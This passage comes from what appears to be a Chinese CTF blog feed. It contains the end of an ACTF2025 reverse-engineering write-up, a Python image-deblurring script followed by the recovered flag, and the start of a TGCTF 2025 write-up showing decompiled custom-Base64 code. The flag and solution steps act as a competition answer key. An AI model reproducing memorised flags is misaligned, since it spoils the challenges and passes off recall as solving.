class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deblur_image</span>(<span class="params">blurred_image, motion_kernel, num_iterations=<span class="number">30</span>, learning_rate=<span class="number">0.01</span></span>):</span><br><span class="line">    kernel = motion_kernel.reshape(<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">    padded_kernel = np.zeros((<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line">    padded_kernel[:<span class="number">16</span>, :<span class="number">16</span>] = kernel</span><br><span class="line">    kernel_fft = np.fft.fft2(padded_kernel)</span><br><span class="line">    blurred_fft = np.fft.fft2(blurred_image)</span><br><span class="line">    K = <span class="number">0.01</span></span><br><span class="line">    kernel_fft_conj = np.conj(kernel_fft)</span><br><span class="line">    deblurred_fft = (kernel_fft_conj * blurred_fft) / (np.<span class="built_in">abs</span>(kernel_fft)**<span class="number">2</span> + K)</span><br><span class="line">    deblurred = np.real(np.fft.ifft2(deblurred_fft))</span><br><span class="line">    deblurred = np.clip(deblurred, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> deblurred.astype(np.uint8)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_and_process_image</span>(<span class="params">image_path, motion_data</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    img_array = np.array(img)</span><br><span class="line">    motion_kernel = np.array(motion_data)</span><br><span class="line">    deblurred_img = deblur_image(img_array, motion_kernel)</span><br><span class="line">    <span class="keyword">return</span> deblurred_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    motion_data = np.array([</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0055596731</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0055596731</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>])</span><br><span class="line">    </span><br><span class="line">    image_path = <span class="string">r&quot;Layer2_Decrypted.bmp&quot;</span></span><br><span class="line">    </span><br><span class="line">    original_img = np.array(Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&#x27;L&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    deblurred_img = load_and_process_image(image_path, motion_data)</span><br><span class="line">    </span><br><span class="line">    Image.fromarray(deblurred_img).save(<span class="string">&#x27;deblurred_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后得到一张可以看清flag的图片。</p><p><img src="/2025/04/27/ACTF-Deeptx/image-3.png" alt="alt text"></p><p>得到flag <code>ACTF&#123;DeEptCUdAR1VQVZ&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ACTF2025-Reverse-Deeptx-WP&quot;&gt;&lt;a href=&quot;#ACTF2025-Reverse-Deeptx-WP&quot; class=&quot;headerlink&quot; title=&quot;ACTF2025 Reverse Deeptx WP&quot;&gt;&lt;/a&gt;ACTF2025</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>TGCTF 2025 逆向WP</title>
    <link href="https://tkazer.github.io/2025/04/13/TGCTF2025/"/>
    <id>https://tkazer.github.io/2025/04/13/TGCTF2025/</id>
    <published>2025-04-13T11:12:25.000Z</published>
    <updated>2025-04-16T04:16:50.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TGCTF-2025-逆向WP"><a href="#TGCTF-2025-逆向WP" class="headerlink" title="TGCTF 2025 逆向WP"></a>TGCTF 2025 逆向WP</h1><p>战队名：不知道</p><p>排名：3</p><p>上次XYCTF是痛失Web手，这次又是痛失Pwn手，啥时候能全队一起打一次（）。这次Re难度还行，磨磨唧唧整了一会也是AK了。</p><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>Base64 变种加密</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">sub_7FF7DC6C10E0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  __int64 v7; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">size_t</span> v8; <span class="comment">// rcx</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// r8</span></span><br><span class="line">  __int64 v10; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// edi</span></span><br><span class="line">  __int64 v19; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v23; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v27; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v28; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v30[<span class="number">80</span>]; <span class="comment">// [rsp+20h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+90h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v30, <span class="string">&quot;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v2;</span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(a1 + v2) );</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="type">int</span>)v2 / <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v2 == <span class="number">3</span> * ((<span class="type">int</span>)v2 / <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">4</span> * v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">int</span>)v2 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">1</span>;</span><br><span class="line">    v6 = <span class="number">4</span> * v4 + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">int</span>)v2 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">2</span>;</span><br><span class="line">    v6 = <span class="number">4</span> * v4 + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v31;</span><br><span class="line">    v6 = v31;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = v6;</span><br><span class="line">  v8 = v6 + <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">    v8 = <span class="number">-1</span>;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(v8);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v2 - v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = a1 + <span class="number">2</span>;</span><br><span class="line">    v11 = ((<span class="type">int</span>)v2 - v5 - <span class="number">1LL</span>) / <span class="number">3uLL</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 += <span class="number">4</span>;</span><br><span class="line">      v12 = *(<span class="type">unsigned</span> 